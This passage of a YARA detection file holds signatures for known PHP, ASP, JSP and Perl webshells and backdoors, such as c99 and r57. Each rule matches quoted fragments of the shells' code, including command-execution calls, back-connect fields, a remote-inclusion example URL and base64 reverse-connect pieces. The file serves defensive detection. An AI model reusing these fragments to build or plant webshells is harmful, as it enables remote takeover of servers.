	strings:
		$s0 = "a CGI by Fuzzyman"
		$s1 = "\"\"\"+fontline +\"Version : \" + versionstring + \"\"\", Running on : \"\"\" + "
		$s2 = "values = map(lambda x: x.value, theform[field])     # allows for"
	condition:
		1 of them
}
rule ru24_post_sh_php_php {
	meta:
		description = "Semi-Auto-generated  - file ru24_post_sh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "5b334d494564393f419af745dc1eeec7"
		id = "78669d3e-629b-591a-a766-923e37d1fdba"
	strings:
		$s1 = "<title>Ru24PostWebShell - \".$_POST['cmd'].\"</title>" fullword
		$s3 = "if ((!$_POST['cmd']) || ($_POST['cmd']==\"\")) { $_POST['cmd']=\"id;pwd;uname -a"
		$s4 = "Writed by DreAmeRz" fullword
	condition:
		1 of them
}
rule DTool_Pro_php {
	meta:
		description = "Semi-Auto-generated  - file DTool Pro.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "366ad973a3f327dfbfb915b0faaea5a6"
		id = "c02c522c-8418-5760-869a-52b41785bebc"
	strings:
		$s0 = "r3v3ng4ns\\nDigite"
		$s1 = "if(!@opendir($chdir)) $ch_msg=\"dtool: line 1: chdir: It seems that the permissi"
		$s3 = "if (empty($cmd) and $ch_msg==\"\") echo (\"Comandos Exclusivos do DTool Pro\\n"
	condition:
		1 of them
}
rule telnetd_pl {
	meta:
		description = "Semi-Auto-generated  - file telnetd.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "5f61136afd17eb025109304bd8d6d414"
		id = "05b5d247-3133-5902-a2ee-b84fa89c7f32"
	strings:
		$s0 = "0ldW0lf" fullword
		$s1 = "However you are lucky :P"
		$s2 = "I'm FuCKeD"
		$s3 = "ioctl($CLIENT{$client}->{shell}, &TIOCSWINSZ, $winsize);#"
		$s4 = "atrix@irc.brasnet.org"
	condition:
		1 of them
}
rule php_include_w_shell_php {
	meta:
		description = "Semi-Auto-generated  - file php-include-w-shell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "4e913f159e33867be729631a7ca46850"
		id = "ddcf9031-2ec8-5a86-8326-60e4a699f494"
	strings:
		$s0 = "$dataout .= \"<td><a href='$MyLoc?$SREQ&incdbhost=$myhost&incdbuser=$myuser&incd"
		$s1 = "if($run == 1 && $phpshellapp && $phpshellhost && $phpshellport) $strOutput .= DB"
	condition:
		1 of them
}
rule Safe0ver_Shell__Safe_Mod_Bypass_By_Evilc0der_php {
	meta:
		description = "Semi-Auto-generated  - file Safe0ver Shell -Safe Mod Bypass By Evilc0der.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "6163b30600f1e80d2bb5afaa753490b6"
		id = "25971f62-33ee-5ed6-8d72-118be5bd2deb"
	strings:
		$s0 = "Safe0ver" fullword
		$s1 = "Script Gecisi Tamamlayamadi!"
		$s2 = "document.write(unescape('%3C%68%74%6D%6C%3E%3C%62%6F%64%79%3E%3C%53%43%52%49%50%"
	condition:
		1 of them
}
rule shell_php_php {
	meta:
		description = "Semi-Auto-generated  - file shell.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "1a95f0163b6dea771da1694de13a3d8d"
		id = "eaf243cb-fa26-5f34-a724-60a08acff636"
	strings:
		$s1 = "/* We have found the parent dir. We must be carefull if the parent " fullword
		$s2 = "$tmpfile = tempnam('/tmp', 'phpshell');"
		$s3 = "if (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $command, $regs)) {" fullword
	condition:
		1 of them
}
rule telnet_cgi {
	meta:
		description = "Semi-Auto-generated  - file telnet.cgi.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "dee697481383052980c20c48de1598d1"
		id = "4ca3dace-cd80-58e4-a4de-47dcc64dac0e"
	strings:
		$s1 = "W A R N I N G: Private Server"
		$s2 = "print \"Set-Cookie: SAVEDPWD=;\\n\"; # remove password cookie"
		$s3 = "$Prompt = $WinNT ? \"$CurrentDir> \" : \"[admin\\@$ServerName $C"
	condition:
		1 of them
}
rule ironshell_php {
	meta:
		description = "Semi-Auto-generated  - file ironshell.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "8bfa2eeb8a3ff6afc619258e39fded56"
		id = "0d63ad03-4d1d-535f-8afe-3edaf1bf4010"
	strings:
		$s0 = "www.ironwarez.info"
		$s1 = "$cookiename = \"wieeeee\";"
		$s2 = "~ Shell I"
		$s3 = "www.rootshell-team.info"
		$s4 = "setcookie($cookiename, $_POST['pass'], time()+3600);"
	condition:
		1 of them
}
rule backdoorfr_php {
	meta:
		description = "Semi-Auto-generated  - file backdoorfr.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "91e4afc7444ed258640e85bcaf0fecfc"
		id = "5ba2b617-a873-5e80-9cfc-c61cc8d605f3"
	strings:
		$s1 = "www.victime.com/index.php?page=http://emplacement_de_la_backdoor.php , ou en tan"
		$s2 = "print(\"<br>Provenance du mail : <input type=\\\"text\\\" name=\\\"provenanc"
	condition:
		1 of them
}
rule aspydrv_asp {
	meta:
		description = "Semi-Auto-generated  - file aspydrv.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "1c01f8a88baee39aa1cebec644bbcb99"
		score = 60
		id = "4420d13e-7015-5083-ba08-b41bf28b00c2"
	strings:
		$s0 = "If mcolFormElem.Exists(LCase(sIndex)) Then Form = mcolFormElem.Item(LCase(sIndex))"
		$s1 = "password"
		$s2 = "session(\"shagman\")="
	condition:
		2 of them
}
rule cmdjsp_jsp {
	meta:
		description = "Semi-Auto-generated  - file cmdjsp.jsp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "b815611cc39f17f05a73444d699341d4"
		id = "048478a8-9622-54c7-80ed-e4e223d14500"
	strings:
		$s0 = "// note that linux = cmd and windows = \"cmd.exe /c + cmd\" " fullword
		$s1 = "Process p = Runtime.getRuntime().exec(\"cmd.exe /C \" + cmd);" fullword
		$s2 = "cmdjsp.jsp"
		$s3 = "michaeldaw.org" fullword
	condition:
		2 of them
}
rule h4ntu_shell__powered_by_tsoi_ {
	meta:
		description = "Semi-Auto-generated  - file h4ntu shell [powered by tsoi].txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "06ed0b2398f8096f1bebf092d0526137"
		id = "186358e6-88a3-5fad-b1ba-a49b2a5dea1c"
	strings:
		$s0 = "h4ntu shell"
		$s1 = "system(\"$cmd 1> /tmp/cmdtemp 2>&1; cat /tmp/cmdtemp; rm /tmp/cmdtemp\");"
	condition:
		1 of them
}
rule Ajan_asp {
	meta:
		description = "Semi-Auto-generated  - file Ajan.asp.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "b6f468252407efc2318639da22b08af0"
		id = "6040fd88-b992-5110-8b37-7711ace30b1a"
	strings:
		$s1 = "c:\\downloaded.zip"
		$s2 = "Set entrika = entrika.CreateTextFile(\"c:\\net.vbs\", True)" fullword
		$s3 = "http://www35.websamba.com/cybervurgun/"
	condition:
		1 of them
}
rule PHANTASMA_php {
	meta:
		description = "Semi-Auto-generated  - file PHANTASMA.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "52779a27fa377ae404761a7ce76a5da7"
		id = "21ff4cee-9cdc-57d1-9c43-e033fdb47de0"
	strings:
		$s0 = ">[*] Safemode Mode Run</DIV>"
		$s1 = "$file1 - $file2 - <a href=$SCRIPT_NAME?$QUERY_STRING&see=$file>$file</a><br>"
		$s2 = "[*] Spawning Shell"
		$s3 = "Cha0s"
	condition:
		2 of them
}
rule MySQL_Web_Interface_Version_0_8_php {
	meta:
		description = "Semi-Auto-generated  - file MySQL Web Interface Version 0.8.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "36d4f34d0a22080f47bb1cb94107c60f"
		id = "90616d2d-082b-5983-a859-62d1c5b8066e"
	strings:
		$s0 = "SooMin Kim"
		$s1 = "http://popeye.snu.ac.kr/~smkim/mysql"
		$s2 = "href='$PHP_SELF?action=dropField&dbname=$dbname&tablename=$tablename"
		$s3 = "<th>Type</th><th>&nbspM&nbsp</th><th>&nbspD&nbsp</th><th>unsigned</th><th>zerofi"
	condition:
		2 of them
}
rule simple_cmd_html {
	meta:
		description = "Semi-Auto-generated  - file simple_cmd.html.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		hash = "c6381412df74dbf3bcd5a2b31522b544"
		id = "30990574-02a0-5eed-8317-847b6be13300"
	strings:
		$s1 = "<title>G-Security Webshell</title>" fullword
		$s2 = "<input type=TEXT name=\"-cmd\" size=64 value=\"<?=$cmd?>\" " fullword
		$s3 = "<? if($cmd != \"\") print Shell_Exec($cmd);?>" fullword
		$s4 = "<? $cmd = $_REQUEST[\"-cmd\"];?>" fullword
	condition:
		all of them
}
rule _1_c2007_php_php_c100_php {
	meta:
		description = "Semi-Auto-generated  - from files 1.txt, c2007.php.php.txt, c100.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "44542e5c3e9790815c49d5f9beffbbf2"
		hash1 = "d089e7168373a0634e1ac18c0ee00085"
		hash2 = "38fd7e45f9c11a37463c3ded1c76af4c"
		id = "00ada6a4-a32a-5184-867d-e10a8c95c41c"
	strings:
		$s0 = "echo \"<b>Changing file-mode (\".$d.$f.\"), \".view_perms_color($d.$f).\" (\""
		$s3 = "echo \"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur"
	condition:
		1 of them
}
rule _nst_php_php_img_php_php_nstview_php_php {
	meta:
		description = "Semi-Auto-generated  - from files nst.php.php.txt, img.php.php.txt, nstview.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "ddaf9f1986d17284de83a17fe5f9fd94"
		hash1 = "17a07bb84e137b8aa60f87cd6bfab748"
		hash2 = "4745d510fed4378e4b1730f56f25e569"
		id = "238242f5-4e57-5edb-8806-ea5e06f1f637"
	strings:
		$s0 = "<tr><form method=post><td><font color=red><b>Back connect:</b></font></td><td><i"
		$s1 = "$perl_proxy_scp = \"IyEvdXNyL2Jpbi9wZXJsICANCiMhL3Vzci91c2MvcGVybC81LjAwNC9iaW4v"
		$s2 = "<tr><form method=post><td><font color=red><b>Backdoor:</b></font></td><td><input"
	condition:
		1 of them
}
rule _network_php_php_xinfo_php_php_nfm_php_php {
	meta:
		description = "Semi-Auto-generated  - from files network.php.php.txt, xinfo.php.php.txt, nfm.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "acdbba993a5a4186fd864c5e4ea0ba4f"
		hash1 = "2601b6fc1579f263d2f3960ce775df70"
		hash2 = "401fbae5f10283051c39e640b77e4c26"
		id = "4fd11db6-902d-5f1a-96c5-9dfcccce7488"
	strings:
		$s0 = ".textbox { background: White; border: 1px #000000 solid; color: #000099; font-fa"
		$s2 = "<input class='inputbox' type='text' name='pass_de' size=50 onclick=this.value=''"
	condition:
		all of them
}
rule _w_php_php_c99madshell_v2_1_php_php_wacking_php_php_SpecialShell_99_php_php {
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "09609851caa129e40b0d56e90dfc476c"
		id = "ee1fd555-f1bc-59a5-998c-f6098de8623e"
	strings:
		$s2 = "echo \"<hr size=\\\"1\\\" noshade><b>Done!</b><br>Total time (secs.): \".$ft"
		$s3 = "$fqb_log .= \"\\r\\n------------------------------------------\\r\\nDone!\\r"
	condition:
		1 of them
}
rule _r577_php_php_SnIpEr_SA_Shell_php_r57_php_php_r57_Shell_php_php_spy_php_php_s_php_php {
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "911195a9b7c010f61b66439d9048f400"
		hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash3 = "8023394542cddf8aee5dec6072ed02b5"
		hash4 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash5 = "817671e1bdc85e04cc3440bbd9288800"
		id = "44b53124-c8b6-545b-819f-77fd65e5d61b"
	strings:
		$s2 = "'eng_text71'=>\"Second commands param is:\\r\\n- for CHOWN - name of new owner o"
		$s4 = "if(!empty($_POST['s_mask']) && !empty($_POST['m'])) { $sr = new SearchResult"
	condition:
		1 of them
}
rule _c99shell_v1_0_php_php_c99php_SsEs_php_php_ctt_sh_php_php {
	meta:
		description = "Semi-Auto-generated  - from files c99shell_v1.0.php.php.txt, c99php.txt, SsEs.php.php.txt, ctt_sh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash1 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
		hash3 = "671cad517edd254352fe7e0c7c981c39"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
	strings:
		$s0 = "\"AAAAACH5BAEAAAkALAAAAAAUABQAAAR0MMlJqyzFalqEQJuGEQSCnWg6FogpkHAMF4HAJsWh7/ze\""
		$s2 = "\"mTP/zDP//2YAAGYAM2YAZmYAmWYAzGYA/2YzAGYzM2YzZmYzmWYzzGYz/2ZmAGZmM2ZmZmZmmWZm\""
		$s4 = "\"R0lGODlhFAAUAKL/AP/4/8DAwH9/AP/4AL+/vwAAAAAAAAAAACH5BAEAAAEALAAAAAAUABQAQAMo\""
	condition:
		2 of them
}
rule _r577_php_php_spy_php_php_s_php_php {
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash2 = "817671e1bdc85e04cc3440bbd9288800"
		id = "d287136c-534b-51a4-88fc-40ef9f22d910"
	strings:
		$s2 = "echo $te.\"<div align=center><textarea cols=35 name=db_query>\".(!empty($_POST['"
		$s3 = "echo sr(45,\"<b>\".$lang[$language.'_text80'].$arrow.\"</b>\",\"<select name=db>"
	condition:
		1 of them
}
rule webshell_c99_generic {
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash5 = "09609851caa129e40b0d56e90dfc476c"
		hash6 = "671cad517edd254352fe7e0c7c981c39"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "  if ($copy_unset) {foreach($sess_data[\"copy\"] as $k=>$v) {unset($sess_data[\""
		$s1 = "  if (file_exists($mkfile)) {echo \"<b>Make File \\\"\".htmlspecialchars($mkfile"
		$s2 = "  echo \"<center><b>MySQL \".mysql_get_server_info().\" (proto v.\".mysql_get_pr"
		$s3 = "  elseif (!fopen($mkfile,\"w\")) {echo \"<b>Make File \\\"\".htmlspecialchars($m"
	condition:
		all of them
}
rule _w_php_php_c99madshell_v2_1_php_php_wacking_php_php_c99shell_v1_0_php_php_c99php_SpecialShell_99_php_php {
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash5 = "09609851caa129e40b0d56e90dfc476c"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
	strings:
		$s0 = "$sess_data[\"cut\"] = array(); c99_s"
		$s3 = "if ((!eregi(\"http://\",$uploadurl)) and (!eregi(\"https://\",$uploadurl))"
	condition:
		1 of them
}
rule _w_php_php_wacking_php_php_SpecialShell_99_php_php {
	meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, wacking.php.php.txt, SpecialShell_99.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "9c5bb5e3a46ec28039e8986324e42792"
		hash2 = "09609851caa129e40b0d56e90dfc476c"
		id = "c01ad0e5-1aff-5128-9d0c-5d0967532a4b"
	strings:
		$s0 = "\"<td>&nbsp;<a href=\\\"\".$sql_surl.\"sql_act=query&sql_query=\".ur"
		$s2 = "c99sh_sqlquery"
	condition:
		1 of them
}
rule _w_php_php_c99madshell_v2_1_php_php_wacking_php_php_SsEs_php_php_SpecialShell_99_php_php {
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
		hash4 = "09609851caa129e40b0d56e90dfc476c"
		id = "ee1fd555-f1bc-59a5-998c-f6098de8623e"
	strings:
		$s0 = "else {$act = \"f\"; $d = dirname($mkfile); if (substr($d,-1) != DIRECTORY_SEPA"
		$s3 = "else {echo \"<b>File \\\"\".$sql_getfile.\"\\\":</b><br>\".nl2br(htmlspec"
	condition:
		1 of them
}
rule _r577_php_php_SnIpEr_SA_Shell_php_r57_php_php_spy_php_php_s_php_php {
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "911195a9b7c010f61b66439d9048f400"
		hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash3 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash4 = "817671e1bdc85e04cc3440bbd9288800"
		id = "44b53124-c8b6-545b-819f-77fd65e5d61b"
	strings:
		$s0 = "echo sr(15,\"<b>\".$lang[$language.'_text"
		$s1 = ".$arrow.\"</b>\",in('text','"
	condition:
		2 of them
}
rule _r577_php_php_SnIpEr_SA_Shell_php_r57_php_php {
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, SnIpEr_SA Shell.php.txt, r57.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "911195a9b7c010f61b66439d9048f400"
		hash2 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		id = "44b53124-c8b6-545b-819f-77fd65e5d61b"
	strings:
		$s0 = "'ru_text9' =>'???????? ????? ? ???????? ??? ? /bin/bash'," fullword
		$s1 = "$name='ec371748dc2da624b35a4f8f685dd122'"
		$s2 = "rst.void.ru"
	condition:
		3 of them
}
rule _r577_php_php_r57_Shell_php_php_spy_php_php_s_php_php {
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "8023394542cddf8aee5dec6072ed02b5"
		hash2 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash3 = "817671e1bdc85e04cc3440bbd9288800"
		id = "7a31b923-15e5-5af4-9ad0-8d261fedf7c4"
	strings:
		$s0 = "echo ws(2).$lb.\" <a"
		$s1 = "$sql = \"LOAD DATA INFILE \\\"\".$_POST['test3_file']"
		$s3 = "if (empty($_POST['cmd'])&&!$safe_mode) { $_POST['cmd']=($windows)?(\"dir\"):(\"l"
	condition:
		2 of them
}
rule _wacking_php_php_1_SpecialShell_99_php_php_c100_php {
	meta:
		description = "Semi-Auto-generated  - from files wacking.php.php.txt, 1.txt, SpecialShell_99.php.php.txt, c100.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "9c5bb5e3a46ec28039e8986324e42792"
		hash1 = "44542e5c3e9790815c49d5f9beffbbf2"
		hash2 = "09609851caa129e40b0d56e90dfc476c"
		hash3 = "38fd7e45f9c11a37463c3ded1c76af4c"
		id = "3dac5550-598a-5a0f-95c3-2e0162a686ee"
	strings:
		$s0 = "if(eregi(\"./shbd $por\",$scan))"
		$s1 = "$_POST['backconnectip']"
		$s2 = "$_POST['backcconnmsg']"
	condition:
		1 of them
}
rule _r577_php_php_r57_php_php_r57_Shell_php_php_spy_php_php_s_php_php {
	meta:
		description = "Semi-Auto-generated  - from files r577.php.php.txt, r57.php.php.txt, r57 Shell.php.php.txt, spy.php.php.txt, s.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash2 = "8023394542cddf8aee5dec6072ed02b5"
		hash3 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash4 = "817671e1bdc85e04cc3440bbd9288800"
		id = "093892f6-ff53-5bd1-b7b2-fea21a9258aa"
	strings:
		$s1 = "if(rmdir($_POST['mk_name']))"
		$s2 = "$r .= '<tr><td>'.ws(3).'<font face=Verdana size=-2><b>'.$key.'</b></font></td>"
		$s3 = "if(unlink($_POST['mk_name'])) echo \"<table width=100% cellpadding=0 cell"
	condition:
		2 of them
}
rule _w_php_php_wacking_php_php_SsEs_php_php_SpecialShell_99_php_php {
	meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, wacking.php.php.txt, SsEs.php.php.txt, SpecialShell_99.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "9c5bb5e3a46ec28039e8986324e42792"
		hash2 = "6cd50a14ea0da0df6a246a60c8f6f9c9"
		hash3 = "09609851caa129e40b0d56e90dfc476c"
		id = "81480945-b684-50b6-9431-4ab7a786b214"
	strings:
		$s0 = "\"ext_avi\"=>array(\"ext_avi\",\"ext_mov\",\"ext_mvi"
		$s1 = "echo \"<b>Execute file:</b><form action=\\\"\".$surl.\"\\\" method=POST><inpu"
		$s2 = "\"ext_htaccess\"=>array(\"ext_htaccess\",\"ext_htpasswd"
	condition:
		1 of them
}

rule multiple_php_webshells {
	meta:
		description = "Semi-Auto-generated  - from files multiple_php_webshells"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "0714f80f35c1fddef1f8938b8d42a4c8"
		hash1 = "911195a9b7c010f61b66439d9048f400"
		hash2 = "be0f67f3e995517d18859ed57b4b4389"
		hash3 = "eddf7a8fde1e50a7f2a817ef7cece24f"
		hash4 = "8023394542cddf8aee5dec6072ed02b5"
		hash5 = "eed14de3907c9aa2550d95550d1a2d5f"
		hash6 = "817671e1bdc85e04cc3440bbd9288800"
		hash7 = "7101fe72421402029e2629f3aaed6de7"
		hash8 = "f618f41f7ebeb5e5076986a66593afd1"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
	strings:
		$s0 = "kVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuI"
		$s2 = "sNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0"
		$s4 = "A8c3lzL3NvY2tldC5oPg0KI2luY2x1ZGUgPG5ldGluZXQvaW4uaD4NCiNpbmNsdWRlIDxlcnJuby5oPg"
	condition:
		2 of them
}
rule _w_php_php_c99madshell_v2_1_php_php_wacking_php_php {
	meta:
		description = "Semi-Auto-generated  - from files w.php.php.txt, c99madshell_v2.1.php.php.txt, wacking.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		id = "ee1fd555-f1bc-59a5-998c-f6098de8623e"
	strings:
		$s0 = "<b>Dumped! Dump has been writed to "
		$s1 = "if ((!empty($donated_html)) and (in_array($act,$donated_act))) {echo \"<TABLE st"
		$s2 = "<input type=submit name=actarcbuff value=\\\"Pack buffer to archive"
	condition:
		1 of them
}
rule _w_php_php_c99madshell_v2_1_php_php_wacking_php_php_c99shell_v1_0_php_php_c99php {
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "9e9ae0332ada9c3797d6cee92c2ede62"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
	strings:
		$s0 = "@ini_set(\"highlight" fullword
		$s1 = "echo \"<b>Result of execution this PHP-code</b>:<br>\";" fullword
		$s2 = "{$row[] = \"<b>Owner/Group</b>\";}" fullword
	condition:
		2 of them
}
rule _GFS_web_shell_ver_3_1_7___PRiV8_php_nshell_php_php_gfs_sh_php_php {
	meta:
		description = "Semi-Auto-generated  - from files GFS web-shell ver 3.1.7 - PRiV8.php.txt, nshell.php.php.txt, gfs_sh.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "be0f67f3e995517d18859ed57b4b4389"
		hash1 = "4a44d82da21438e32d4f514ab35c26b6"
		hash2 = "f618f41f7ebeb5e5076986a66593afd1"
		id = "4d1dd87b-1ffd-564d-9411-c5d2fc01ae0f"
	strings:
		$s2 = "echo $uname.\"</font><br><b>\";" fullword
		$s3 = "while(!feof($f)) { $res.=fread($f,1024); }" fullword
		$s4 = "echo \"user=\".@get_current_user().\" uid=\".@getmyuid().\" gid=\".@getmygid()"
	condition:
		2 of them
}
rule _w_php_php_c99madshell_v2_1_php_php_wacking_php_php_c99shell_v1_0_php_php_SpecialShell_99_php_php {
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "3ca5886cd54d495dc95793579611f59a"
		hash2 = "9c5bb5e3a46ec28039e8986324e42792"
		hash3 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash4 = "09609851caa129e40b0d56e90dfc476c"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
	strings:
		$s0 = "c99ftpbrutecheck"
		$s1 = "$ftpquick_t = round(getmicrotime()-$ftpquick_st,4);" fullword
		$s2 = "$fqb_lenght = $nixpwdperpage;" fullword
		$s3 = "$sock = @ftp_connect($host,$port,$timeout);" fullword
	condition:
		2 of them
}
rule _w_php_php_wacking_php_php_c99shell_v1_0_php_php_c99php_SpecialShell_99_php_php {
	meta:
		description = "Semi-Auto-generated "
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "38a3f9f2aa47c2e940695f3dba6a7bb2"
		hash1 = "9c5bb5e3a46ec28039e8986324e42792"
		hash2 = "d8ae5819a0a2349ec552cbcf3a62c975"
		hash3 = "9e9ae0332ada9c3797d6cee92c2ede62"
		hash4 = "09609851caa129e40b0d56e90dfc476c"
		id = "ce88027c-ae08-59f3-948d-6f3d58515468"
	strings:
		$s0 = "$sqlquicklaunch[] = array(\""
		$s1 = "else {echo \"<center><b>File does not exists (\".htmlspecialchars($d.$f).\")!<"
	condition:
		all of them
}
rule _antichat_php_php_Fatalshell_php_php_a_gedit_php_php {
	meta:
		description = "Semi-Auto-generated  - from files antichat.php.php.txt, Fatalshell.php.php.txt, a_gedit.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		super_rule = 1
		hash0 = "128e90b5e2df97e21e96d8e268cde7e3"
		hash1 = "b15583f4eaad10a25ef53ab451a4a26d"
		hash2 = "ab9c6b24ca15f4a1b7086cad78ff0f78"
		id = "6bf5640f-0773-5d93-8d27-0844062017c7"
	strings:
		$s0 = "if(@$_POST['save'])writef($file,$_POST['data']);" fullword
		$s1 = "if($action==\"phpeval\"){" fullword
		$s2 = "$uploadfile = $dirupload.\"/\".$_POST['filename'];" fullword
		$s3 = "$dir=getcwd().\"/\";" fullword
	condition:
		2 of them
}
